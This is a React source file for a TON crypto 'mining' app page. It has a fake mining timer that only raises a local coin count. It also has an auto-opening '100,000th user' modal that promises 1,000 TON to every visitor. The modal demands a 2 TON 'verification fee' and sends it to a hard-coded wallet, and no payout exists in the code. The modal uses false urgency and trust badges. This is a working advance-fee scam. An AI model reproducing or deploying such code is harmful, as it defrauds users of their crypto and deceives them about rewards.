"use client";

import React, { useState, useEffect, useRef, useCallback } from 'react';
import { Button } from '@/components/ui/button';
import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';
import { Play, Crown, Store, Award, GraduationCap } from 'lucide-react';
import { useSpaceCoins } from '../hooks/useSpaceCoins';
import { useTonConnectUI } from '@tonconnect/ui-react';
import { useToast } from '@/hooks/use-toast';
import { textToBase64 } from '../utils/ton';

interface MiningPageProps {
  onNavigate?: (page: string) => void;
}

const MiningPage: React.FC<MiningPageProps> = ({ onNavigate }) => {
  const {
    spaceCoins,
    addCoins
  } = useSpaceCoins();
  const [tonConnectUI] = useTonConnectUI();
  const { toast } = useToast();
  const [miningSpeed, setMiningSpeed] = useState(1);
  const [coinsPerSecond, setCoinsPerSecond] = useState(0.1);
  const [miningActive, setMiningActive] = useState(false);
  const [remainingTime, setRemainingTime] = useState(28800); // 8 hours
  const [username, setUsername] = useState('');
  const [show100kModal, setShow100kModal] = useState(false);
  // متغير لتذكر إذا أغلق المستخدم المنشور بهذا التاب
  const closed100kRef = useRef(false);
  const [isProcessingPayment, setIsProcessingPayment] = useState(false);
  const intervalRef = useRef<NodeJS.Timeout | null>(null);
  const initializedRef = useRef(false);
  const lastProcessedTimeRef = useRef<number>(0);

  // Target address for 100k event payment
  const TARGET_PAYMENT_ADDRESS = 'UQBJSGcoWTcjdkWFSxA4A6sLmnD5uFKoKHFEHc3LqGJvFWya';

  // Memoized coin adding function to prevent unnecessary re-renders
  const addCoinsStable = useCallback((amount: number) => {
    addCoins(amount);
  }, [addCoins]);

  // Prevent scrolling when component loads
  useEffect(() => {
    document.body.style.overflow = 'hidden';
    document.documentElement.style.overflow = 'hidden';
    return () => {
      document.body.style.overflow = 'auto';
      document.documentElement.style.overflow = 'auto';
    };
  }, []);

  // Initialize component data once
  useEffect(() => {
    if (initializedRef.current) return;
    initializedRef.current = true;
    console.log('Initializing mining page...');

    // Load username
    const storedUsername = localStorage.getItem('username');
    if (storedUsername) {
      setUsername(storedUsername);
    }

    // Load mining speed
    const storedMiningSpeed = localStorage.getItem('miningSpeed');
    const currentMiningSpeed = storedMiningSpeed ? parseFloat(storedMiningSpeed) : 1;
    setMiningSpeed(currentMiningSpeed);
    setCoinsPerSecond(0.1 * currentMiningSpeed);

    // Restore mining state
    restoreMiningState(currentMiningSpeed);
  }, []);

  // إظهار منشور 100k تلقائيًا عند الدخول لأول مرة
  useEffect(() => {
    if (!closed100kRef.current) {
      setShow100kModal(true);
    }
  }, []);

  const restoreMiningState = (currentMiningSpeed: number) => {
    const miningStartTime = localStorage.getItem('miningStartTime');
    const miningDuration = localStorage.getItem('miningDuration');
    const wasMiningActive = localStorage.getItem('miningActive') === 'true';
    const lastProcessedTime = localStorage.getItem('lastProcessedTime');
    console.log('Restoring mining state:', {
      wasMiningActive,
      miningStartTime,
      miningDuration,
      lastProcessedTime
    });
    if (wasMiningActive && miningStartTime && miningDuration) {
      const startTime = parseInt(miningStartTime);
      const duration = parseInt(miningDuration);
      const currentTime = Date.now();
      const elapsedTimeMs = currentTime - startTime;
      const elapsedTimeSeconds = Math.floor(elapsedTimeMs / 1000);

      // Get the last processed time to avoid duplicate calculations
      const lastProcessed = lastProcessedTime ? parseInt(lastProcessedTime) : startTime;
      const unprocessedTimeMs = currentTime - lastProcessed;
      const unprocessedTimeSeconds = Math.floor(unprocessedTimeMs / 1000);
      console.log('Mining restoration details:', {
        startTime: new Date(startTime).toLocaleString(),
        currentTime: new Date(currentTime).toLocaleString(),
        lastProcessed: new Date(lastProcessed).toLocaleString(),
        elapsedTimeSeconds,
        unprocessedTimeSeconds,
        duration
      });
      if (elapsedTimeSeconds < duration && elapsedTimeSeconds >= 0) {
        // Mining is still active
        const newRemainingTime = Math.max(0, duration - elapsedTimeSeconds);
        setMiningActive(true);
        setRemainingTime(newRemainingTime);

        // Calculate coins earned only for unprocessed time
        const baseCoinsPerSecond = 0.1;
        const coinsEarned = Math.round(Math.max(0, unprocessedTimeSeconds) * (baseCoinsPerSecond * currentMiningSpeed) * 100) / 100;
        console.log('Adding offline mining coins for unprocessed time:', coinsEarned);
        if (coinsEarned > 0) {
          addCoinsStable(coinsEarned);
        }

        // Update last processed time
        localStorage.setItem('lastProcessedTime', currentTime.toString());
        lastProcessedTimeRef.current = currentTime;
      } else if (elapsedTimeSeconds >= duration) {
        // Mining session completed while away
        console.log('Mining session completed while offline');
        completeMiningSession(duration, currentMiningSpeed, lastProcessed, startTime + duration * 1000);
      } else {
        // Invalid state, reset
        resetMiningState();
      }
    }
  };

  const completeMiningSession = (duration: number, currentMiningSpeed: number, lastProcessed: number, sessionEndTime: number) => {
    setMiningActive(false);
    setRemainingTime(28800);

    // Calculate coins only for the remaining unprocessed time until session end
    const unprocessedTime = Math.max(0, Math.floor((sessionEndTime - lastProcessed) / 1000));
    const baseCoinsPerSecond = 0.1;
    const totalCoinsEarned = Math.round(unprocessedTime * (baseCoinsPerSecond * currentMiningSpeed) * 100) / 100;
    console.log('Adding coins from completed session (unprocessed time only):', totalCoinsEarned);
    if (totalCoinsEarned > 0) {
      addCoinsStable(totalCoinsEarned);
    }
    resetMiningState();
  };

  const resetMiningState = () => {
    localStorage.removeItem('miningStartTime');
    localStorage.removeItem('miningDuration');
    localStorage.removeItem('lastProcessedTime');
    localStorage.setItem('miningActive', 'false');
    lastProcessedTimeRef.current = 0;
  };

  // Handle mining interval - Fixed to prevent infinite loop
  useEffect(() => {
    // Clear any existing interval
    if (intervalRef.current) {
      clearInterval(intervalRef.current);
      intervalRef.current = null;
    }

    // Only start interval if mining is active and there's time remaining
    if (miningActive && remainingTime > 0) {
      console.log('Starting mining interval');
      intervalRef.current = setInterval(() => {
        const currentTime = Date.now();
        setRemainingTime(prevTime => {
          const newTime = Math.max(0, prevTime - 1);
          if (newTime <= 0) {
            console.log('Mining session completed');
            setMiningActive(false);
            resetMiningState();
            return 0;
          }
          return newTime;
        });

        // Add coins with stable reference and update last processed time
        const coinsToAdd = Math.round(coinsPerSecond * 100) / 100;
        if (coinsToAdd > 0) {
          addCoinsStable(coinsToAdd);
        }

        // Update last processed time every second
        localStorage.setItem('lastProcessedTime', currentTime.toString());
        lastProcessedTimeRef.current = currentTime;
      }, 1000);
    }

    // Cleanup function
    return () => {
      if (intervalRef.current) {
        clearInterval(intervalRef.current);
        intervalRef.current = null;
      }
    };
  }, [miningActive, remainingTime, coinsPerSecond, addCoinsStable]);

  // Save mining speed when it changes
  useEffect(() => {
    if (miningSpeed > 0) {
      localStorage.setItem('miningSpeed', miningSpeed.toString());
      setCoinsPerSecond(0.1 * miningSpeed);
    }
  }, [miningSpeed]);

  // Save mining state when it changes
  useEffect(() => {
    localStorage.setItem('miningActive', miningActive.toString());
  }, [miningActive]);

  const handleStartMining = () => {
    if (!miningActive && remainingTime > 0) {
      const currentTime = Date.now();
      const duration = 28800; // 8 hours in seconds

      console.log('Starting mining session');

      // Save mining state
      localStorage.setItem('miningStartTime', currentTime.toString());
      localStorage.setItem('miningDuration', duration.toString());
      localStorage.setItem('lastProcessedTime', currentTime.toString());
      localStorage.setItem('miningActive', 'true');
      setMiningActive(true);
      setRemainingTime(duration);
      lastProcessedTimeRef.current = currentTime;
    }
  };

  const formatTime = (timeInSeconds: number): string => {
    const hours = Math.floor(timeInSeconds / 3600);
    const minutes = Math.floor(timeInSeconds % 3600 / 60);
    const seconds = timeInSeconds % 60;
    return `${hours}h ${minutes}m ${seconds}s`;
  };

  // Handle page visibility change to save state
  useEffect(() => {
    const handleVisibilityChange = () => {
      if (document.hidden && miningActive) {
        // Save current state when page becomes hidden
        const currentTime = Date.now();
        localStorage.setItem('lastProcessedTime', currentTime.toString());
        lastProcessedTimeRef.current = currentTime;
        console.log('Saving mining state when page hidden');
      }
    };
    const handleBeforeUnload = () => {
      if (miningActive) {
        const currentTime = Date.now();
        localStorage.setItem('lastProcessedTime', currentTime.toString());
      }
    };
    document.addEventListener('visibilitychange', handleVisibilityChange);
    window.addEventListener('beforeunload', handleBeforeUnload);
    return () => {
      document.removeEventListener('visibilitychange', handleVisibilityChange);
      window.removeEventListener('beforeunload', handleBeforeUnload);
    };
  }, [miningActive]);

  const handle100kUserEvent = () => {
    setShow100kModal(true);
  };

  // إغلاق المنشور وتأكيد عدم إعادة إظهاره في نفس الجلسة
  const handleClose100kModal = () => {
    setShow100kModal(false);
    closed100kRef.current = true;
  };

  const handlePayment = async () => {
    if (!tonConnectUI.wallet) {
      toast({
        title: 'Wallet Not Connected',
        description: 'Please connect your TON wallet first from the wallet page',
        variant: "destructive"
      });
      return;
    }

    setIsProcessingPayment(true);
    
    try {
      console.log('Sending simple payment without payload');
      console.log('Target address:', TARGET_PAYMENT_ADDRESS);
      console.log('Amount: 2 TON');

      const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 300, // 5 minutes
        messages: [
          {
            address: TARGET_PAYMENT_ADDRESS,
            amount: (2 * 1e9).toString(), // 2 TON in nanoTON
            // Removed payload to avoid format issues
          },
        ],
      };

      const result = await tonConnectUI.sendTransaction(transaction);
      
      console.log('Payment transaction sent:', result);
      
      toast({
        title: '✅ Payment Sent Successfully!',
        description: '2 TON has been sent successfully. Your reward will be processed soon.',
      });
      
      setShow100kModal(false);
      
      // Add bonus coins as a reward for completing the payment
      addCoinsStable(10000); // Bonus coins for participating
      
    } catch (error) {
      console.error('Payment failed:', error);
      
      let errorMessage = 'Failed to send transaction. Please try again.';
      
      if (error instanceof Error) {
        if (error.message.includes('User declined')) {
          errorMessage = 'Transaction was cancelled by user.';
        } else if (error.message.includes('insufficient funds')) {
          errorMessage = 'Insufficient funds in wallet.';
        }
      }
      
      toast({
        title: 'Payment Failed',
        description: errorMessage,
        variant: "destructive"
      });
    } finally {
      setIsProcessingPayment(false);
    }
  };

  const handleQuickNavigation = (page: string) => {
    if (onNavigate) {
      onNavigate(page);
    }
  };

  return (
    <div className="fixed inset-0 overflow-hidden">
      {/* Background Image - Updated to use new space image */}
      <div 
        className="fixed inset-0 bg-cover bg-center bg-no-repeat" 
        style={{
          backgroundImage: `url('/lovable-uploads/af80e2de-8d4a-4e01-912b-fce62068956f.png')`
        }} 
      />
      
      {/* Top Navigation Buttons */}
      <div className="fixed top-4 left-0 right-0 z-20 px-4">
        <div className="flex justify-center space-x-4">
          {/* 100,000th User Event Button */}
          <div className="flex flex-col items-center">
            <Button 
              onClick={handle100kUserEvent}
              className="w-12 h-12 rounded-full bg-gradient-to-r from-yellow-400 via-yellow-500 to-yellow-600 hover:from-yellow-500 hover:via-yellow-600 hover:to-yellow-700 shadow-lg border-2 border-yellow-300/60 hover:scale-105 transition-all duration-300 p-0"
              title="100,000th User Event"
            >
              <Award className="w-6 h-6 text-white drop-shadow-md" />
            </Button>
            <span className="text-white text-xs font-medium mt-1 drop-shadow-lg">100k Event</span>
          </div>

          {/* Courses Button - NEW */}
          <div className="flex flex-col items-center">
            <Button 
              onClick={() => handleQuickNavigation('courses')}
              className="w-12 h-12 rounded-full bg-gradient-to-r from-blue-500 to-indigo-600 hover:from-blue-600 hover:to-indigo-700 shadow-lg border-2 border-blue-400/50 hover:scale-105 transition-all duration-300 p-0"
              title="Courses"
            >
              <GraduationCap className="w-6 h-6 text-white drop-shadow-md" />
            </Button>
            <span className="text-white text-xs font-medium mt-1 drop-shadow-lg">Courses</span>
          </div>

          {/* Daily Rush Button */}
          <div className="flex flex-col items-center">
            <Button 
              onClick={() => handleQuickNavigation('daily-rush')}
              className="w-12 h-12 rounded-full bg-gradient-to-r from-orange-500 to-red-500 hover:from-orange-600 hover:to-red-600 shadow-lg border-2 border-orange-400/50 hover:scale-105 transition-all duration-300 p-0"
              title="Daily Rush"
            >
              <Crown className="w-6 h-6 text-white drop-shadow-md" />
            </Button>
            <span className="text-white text-xs font-medium mt-1 drop-shadow-lg">Daily Rush</span>
          </div>
          
          {/* Store Button */}
          <div className="flex flex-col items-center">
            <Button 
              onClick={() => handleQuickNavigation('store')}
              className="w-12 h-12 rounded-full bg-gradient-to-r from-purple-500 to-pink-500 hover:from-purple-600 hover:to-pink-600 shadow-lg border-2 border-purple-400/50 hover:scale-105 transition-all duration-300 p-0"
              title="Store"
            >
              <Store className="w-6 h-6 text-white drop-shadow-md" />
            </Button>
            <span className="text-white text-xs font-medium mt-1 drop-shadow-lg">Store</span>
          </div>
        </div>
      </div>
      
      {/* Content positioned at bottom */}
      <div className="fixed bottom-0 left-0 right-0 z-10 p-6 pb-20 flex flex-col items-center py-[50px]">
        {/* Username with Matrix-style font */}
        {username && (
          <div className="text-center mb-4">
            <p className="text-white text-2xl font-bold font-mono" style={{
              fontVariantNumeric: 'tabular-nums'
            }}>
              {username}
            </p>
          </div>
        )}

        {/* Balance */}
        <div className="flex items-center justify-center gap-3 mb-4">
          <div className="w-10 h-10 rounded-full flex items-center justify-center overflow-hidden">
            <img 
              src="/lovable-uploads/46b9f7e6-4f32-4240-9fc4-16d1bcdec0d0.png" 
              alt="Space Coin" 
              className="w-full h-full object-cover" 
            />
          </div>
          <span className="text-white text-3xl font-bold">
            {Math.floor(spaceCoins).toLocaleString()}
          </span>
        </div>

        {/* Mining Rate Display */}
        {miningActive && (
          <div className="text-center mb-2">
            <p className="text-green-400 text-sm">
              Mining: {(coinsPerSecond * 3600).toFixed(2)} coins/hour
            </p>
          </div>
        )}

        {/* Mining Time Display - Only show when mining is active */}
        {miningActive && (
          <div className="text-center mb-4">
            <p className="text-white text-lg">Mining time remaining:</p>
            <p className="text-white text-xl font-bold">{formatTime(remainingTime)}</p>
          </div>
        )}

        {/* Mining Button - Only show Start Mining button when not mining */}
        {!miningActive && (
          <div className="flex justify-center">
            <Button 
              onClick={handleStartMining} 
              disabled={remainingTime <= 0} 
              className="py-4 px-8 text-lg font-bold rounded-xl transition-all duration-300 bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 disabled:opacity-50 disabled:cursor-not-allowed"
            >
              <div className="flex items-center justify-center gap-2">
                <Play className="w-5 h-5" />
                <span>Start Mining</span>
              </div>
            </Button>
          </div>
        )}

        {/* Debug info (will be removed in production) */}
        {process.env.NODE_ENV === 'development' && (
          <div className="text-white text-xs mt-4 text-center opacity-50">
            {/* Debug information */}
          </div>
        )}
      </div>

      {/* 100k User Event Modal - Updated with English text */}
      <Dialog open={show100kModal} onOpenChange={(open) => { if (!open) handleClose100kModal(); }}>
        <DialogContent className="bg-gradient-to-br from-blue-900 via-purple-900 to-pink-900 border-2 border-gold-400 text-white max-w-sm mx-auto">
          <DialogHeader>
            <DialogTitle className="text-center text-lg font-bold text-gold-400 mb-2">
              🎉 100,000th User! 🎉
            </DialogTitle>
          </DialogHeader>
          
          <div className="space-y-3 text-center">
            <div className="bg-black/30 rounded-lg p-3 border border-gold-400/30">
              <h3 className="text-md font-bold text-gold-400 mb-1">
                Congratulations!
              </h3>
              <p className="text-xs text-gray-300">
                You've achieved something special!
              </p>
            </div>

            <div className="bg-green-900/40 rounded-lg p-3 border border-green-400/30">
              <div className="flex items-center justify-center space-x-2 mb-1">
                <span className="text-2xl">💎</span>
                <span className="text-xl font-bold text-green-400">1,000 TON</span>
              </div>
              <p className="text-xs text-gray-300">Reserved for you!</p>
            </div>

            <div className="bg-yellow-900/40 rounded-lg p-2 border border-yellow-400/30">
              <p className="text-xs text-yellow-200">
                ⏰ Valid for 24 hours only
              </p>
            </div>

            <div className="bg-blue-900/40 rounded-lg p-3 border border-blue-400/30">
              <p className="text-xs text-gray-300 mb-2">
                Processing fee: 2 TON required to verify your wallet
              </p>
              <p className="text-xs text-blue-200">
                Helps prevent bots and maintain platform security.
              </p>
            </div>

            <div className="space-y-2 pt-2">
              <Button 
                onClick={handlePayment}
                disabled={isProcessingPayment || !tonConnectUI.wallet}
                className="w-full bg-gradient-to-r from-green-500 to-blue-600 hover:from-green-600 hover:to-blue-700 text-white font-bold py-2 px-4 rounded-lg shadow-lg hover:scale-105 transition-all duration-300 text-sm disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {isProcessingPayment ? (
                  <div className="flex items-center gap-2">
                    <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white"></div>
                    <span>Processing...</span>
                  </div>
                ) : !tonConnectUI.wallet ? (
                  <span>🔗 Connect Wallet First</span>
                ) : (
                  <span>💳 Pay 2 TON & Get 1,000 TON</span>
                )}
              </Button>
              
              <Button 
                onClick={handleClose100kModal}
                variant="outline"
                className="w-full border-gray-400 text-gray-300 hover:bg-gray-800 text-sm py-2"
                disabled={isProcessingPayment}
              >
                Maybe Later
              </Button>
            </div>

            <div className="text-xs text-gray-400 pt-1">
              <p>🔐 Secure • 🌟 Trusted • ⚡ Blockchain Powered</p>
            </div>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default MiningPage;
